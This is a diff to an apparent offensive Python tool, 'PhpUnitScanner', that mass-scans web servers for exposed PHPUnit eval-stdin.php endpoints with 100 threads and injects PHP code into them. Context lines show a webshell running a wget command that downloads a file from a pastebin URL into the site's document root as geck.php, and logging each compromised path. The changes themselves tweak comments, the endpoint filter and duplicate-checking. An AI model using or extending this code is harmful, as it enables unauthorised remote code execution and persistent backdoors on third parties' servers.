@@ -51,7 +51,7 @@ class PhpUnitScanner:
             download_command = f"cd {document_root} && wget https://pastebin.com/raw/k51UcJH1 -O geck.php"
             self.execute_php_code(webshell_path, download_command)
 
-            # Save the document root path and injected shell URL
+            # Log only if the above commands executed successfully
             self.save(f"{webshell_path} => Document Root: {document_root}", "phpunit.txt")
 
             # Check access to the PHP code execution
@@ -75,8 +75,8 @@ class PhpUnitScanner:
             print(f"Failed to retrieve the list of endpoints: {e}")
             return
 
-        # Filter out eval-stdin.php from the endpoint list
-        endpoints = [endpoint for endpoint in endpoints if endpoint.strip() != 'eval-stdin.php']
+        # Filter out eval-stdin.php and other unwanted paths
+        endpoints = [endpoint for endpoint in endpoints if endpoint.strip() not in ['eval-stdin.php', 'other-unwanted-path.php']]
 
         with ThreadPoolExecutor(max_workers=100) as executor:
             future_to_url = {executor.submit(self.check_url, full_url + endpoint.strip()): endpoint for endpoint in endpoints if endpoint.strip()}
@@ -86,10 +86,8 @@ class PhpUnitScanner:
                 try:
                     url, found = future.result()
                     if found:
-                        if url not in valid_found_paths:  # Check if the path is already recorded
-                            valid_found_paths.add(url)
-                            print(f"\033[32m[+] Found => {url}\033[0m")
-                            self.inject_php_code(url, endpoint.strip())
+                        print(f"\033[32m[+] Found => {url}\033[0m")
+                        self.inject_php_code(url, endpoint.strip())
                 except Exception as e:
                     print(f"Error checking {web}: {e}")
 
